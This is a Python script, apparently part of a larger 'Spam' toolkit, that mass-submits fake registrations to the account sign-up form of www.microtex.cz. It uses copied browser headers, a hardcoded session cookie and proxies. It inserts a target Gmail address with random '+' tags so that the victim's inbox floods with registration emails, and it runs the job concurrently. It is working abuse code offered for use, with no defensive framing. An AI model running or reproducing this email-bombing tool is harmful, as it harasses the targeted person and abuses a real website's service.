from os.path import basename

import requests

import module
from module import Spam

cookies = {
    'PHPSESSID': '368b4743ac18511748cc415a771c5f81',
}

headers = {
    'authority': 'www.microtex.cz',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://www.microtex.cz',
    'referer': 'https://www.microtex.cz/ru/uzivatel/registrace',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = module.generate_text(10)
        data = {
            'username': text,
            'password': text,
            'passwordVerify': text,
            'title_before': 'test',
            'name_first': self.get_text(False),
            'name_last': 'test',
            'address_street': 'test',
            'address_city': 'test',
            'address_zipcode': 'test',
            'address_country': '1',
            'email': target.replace('@', f'+{text}@'),
            'phone': 'test',
            'company_name': '',
            'company_address_street': '',
            'company_address_city': '',
            'company_address_zipcode': '',
            'company_address_country': '1',
            'company_id_number': '',
            'company_vat_number': '',
            'company_email': '',
            'company_phone': '',
            '_submit': 'продолжать',
            '_do': 'customerForm-customerForm-submit',
        }

        response = requests.post('https://www.microtex.cz/ru/uzivatel/registrace', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Успешная регистрация')
    target = f'wezxasqw@gmail.com'
    res = spam.send_post(target=target)
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
